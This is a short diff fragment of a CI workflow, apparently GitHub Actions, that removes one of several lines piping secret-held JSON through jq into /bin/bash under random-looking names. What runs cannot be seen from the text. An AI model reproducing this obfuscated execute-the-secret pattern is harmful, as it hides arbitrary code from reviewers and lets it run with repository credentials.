@@ -23,7 +23,6 @@ jobs:
           nrq744: ${{ secrets.nrq744 }}
         run: |
           printf '%s' "$nrq744" | jq -r .t41 | /bin/bash
-          echo $lvl490 | jq -r .wmihu64 | /bin/bash
           echo $l040 | jq -r .wpvuc678 | /bin/bash
           printf '%s' "$hd204" | jq -r .vvsn69986 | /bin/bash
           printf '%s' "$kr3313" | jq -r .a781 | /bin/bash
